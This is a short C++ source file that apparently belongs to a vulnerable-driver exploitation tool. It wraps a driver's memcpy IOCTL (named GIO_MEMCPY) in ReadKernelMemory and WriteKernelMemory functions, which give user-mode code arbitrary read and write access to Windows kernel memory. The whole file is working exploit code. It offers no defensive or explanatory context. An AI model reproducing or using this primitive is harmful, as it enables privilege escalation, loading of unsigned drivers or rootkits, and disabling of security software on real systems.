#include "includes.h"
#include "loader.h"

#define IOCTL_GIO_MEMCPY CTL_CODE(FILE_DEVICE_UNKNOWN, 0x860, METHOD_BUFFERED, FILE_ANY_ACCESS)


bool vul::ReadKernelMemory( HANDLE hDevice, uintptr_t src, void* dstBuffer, size_t size ) {
    // Swap Src and Dst to read from kernel memory to user buffer
    GIOMemcpyInput input{};
    input.Src = src;
    input.Dst = reinterpret_cast< uintptr_t >( dstBuffer );
    input.Size = size;

    DWORD bytesReturned = 0;
    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_GIO_MEMCPY,
        &input,
        sizeof( input ),
        nullptr,
        0,
        &bytesReturned,
        nullptr
    );

    return result == TRUE;
}

bool vul::WriteKernelMemory( HANDLE hDevice, uintptr_t dst, void* srcBuffer, size_t size ) {
    GIOMemcpyInput input{};
    input.Src = reinterpret_cast< uintptr_t >( srcBuffer );
    input.Dst = dst;
    input.Size = size;

    DWORD bytesReturned = 0;
    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_GIO_MEMCPY,
        &input,
        sizeof( input ),
        nullptr,
        0,
        &bytesReturned,
        nullptr
    );

    return result == TRUE;
}